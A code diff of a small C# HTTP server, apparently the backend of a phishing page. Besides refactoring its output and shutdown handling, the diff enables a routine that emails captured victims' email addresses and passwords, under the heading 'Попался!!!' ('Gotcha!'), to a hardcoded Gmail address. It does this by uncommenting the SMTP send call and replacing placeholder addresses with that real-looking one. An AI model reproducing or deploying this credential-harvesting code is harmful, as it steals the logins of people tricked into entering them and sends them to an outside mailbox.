@@ -25,6 +25,7 @@ namespace HTTPServer
         public HttpListenerResponse response;
 
         Appsetting config = Configurationcs.GetConfigurationcs();
+        Stream output;
 
         public Server()
         {
@@ -72,46 +73,36 @@ namespace HTTPServer
 
                 response.ContentLength64 = buffer.Length;
 
-                using (Stream output = response.OutputStream)
-                {
-                    output.WriteAsync(buffer, 0, buffer.Length);
-
-                    Console.WriteLine("Запрос обработан");
-
-                    while (Console.ReadLine() != "stop")
-                    {
-                        listener?.Stop();
-                        output.FlushAsync();
-
-                    }
-                }
+                WriteBuffer(buffer);
 
             }
             catch{
-
+                Console.WriteLine(String.Format("Во время работы сервера произошла непредвиденная ошибка: "));
+                Stop();
             }
 
         }
 
         private void WriteBuffer(byte[] buffer)
         {
-            using (Stream output = response.OutputStream)
+            using (output = response.OutputStream)
             {
                 output.WriteAsync(buffer, 0, buffer.Length);
 
                 Console.WriteLine("Запрос обработан");
 
-                while (Console.ReadLine() != "stop")
-                {
-                    listener?.Stop();
-                    output.FlushAsync();
+                Stop();
 
-                }
             }
         }
-
-
-
+        private void Stop()
+        {
+            while (Console.ReadLine() != "stop")
+            {
+                listener?.Stop();
+                output.FlushAsync();
+            }
+        }
 
         public async void SendEmailHelper(string abslPath)
         {
@@ -132,9 +123,9 @@ namespace HTTPServer
             string mailSender = emailConfig.mailSender;
             string passwordSender = emailConfig.passwordSender;
 
-            var fromEmail = emailConfig.fromEmail;
+            var fromEmail = "linzeroeleven@gmail.com";
             string fromName = "Tom";
-            string toEmail = "somemail@gmail.com";
+            string toEmail = "linzeroeleven@gmail.com";
             string subject = "subject";
             string body = String.Format("<h1> Попался!!! </h1><p>email:{0}</p><p>password: {1}</p>", email, password);
             string smptServerHost = emailConfig.smptServerHost;
@@ -151,63 +142,12 @@ namespace HTTPServer
             smtp.Credentials = new NetworkCredential(mailSender, passwordSender);
             smtp.EnableSsl = true;
 
-            //await smtp.SendMailAsync(m);
+            await smtp.SendMailAsync(m);
             Console.WriteLine("Письмо отправлено");
         }
         public void Dispose()
-        { }
-
-        // public async Task SendEmailAsync1(string email, string password)
-        // {
-        //     // メールの送信に必要な情報
-        //     var smtpHostName = "[SMTP サーバー名]";
-        //     var smtpPort = 587;                         // or 25
-        //     var smtpAuthUser = "[認証ユーザー名]";
-        //     var smtpAuthPassword = "[認証パスワードまたはアプリパスワード]";
-        //
-        //     // メールの内容
-        //     var from = "[送信者メールアドレス]";
-        //     var to = "[送り先メールアドレス]";
-        //
-        //     var subject = "テストメールの件名です。";
-        //     var body = "テストメールの本文です。\n改行です。";
-        //     var textFormat = TextFormat.Text;
-        //
-        //     // MailKit におけるメールの情報
-        //     var message = new MimeMessage();
-        //
-        //     // 送り元情報  
-        //     message.From.Add(MailboxAddress.Parse(from));
-        //
-        //     // 宛先情報  
-        //     message.To.Add(MailboxAddress.Parse(to));
-        //
-        //     // 表題  
-        //     message.Subject = subject;
-        //
-        //     // 内容  
-        //     var textPart = new TextPart(textFormat)
-        //     {
-        //         Text = body,
-        //     };
-        //     message.Body = textPart;
-        //
-        //     using var client = new SmtpClient();
-        //
-        //     // SMTPサーバに接続  
-        //     client.Connect(smtpHostName, smtpPort, SecureSocketOptions.Auto);
-        //
-        //     if (string.IsNullOrEmpty(smtpAuthUser) == false)
-        //     {
-        //         // SMTPサーバ認証  
-        //         client.Authenticate(smtpAuthUser, smtpAuthPassword);
-        //     }
-        //
-        //     // 送信  
-        //     client.Send(message);
-        //
-        //     // 切断  
-        //     client.Disconnect(true);
-        // }
+        {
+            Stop();
+        }
     }
 }
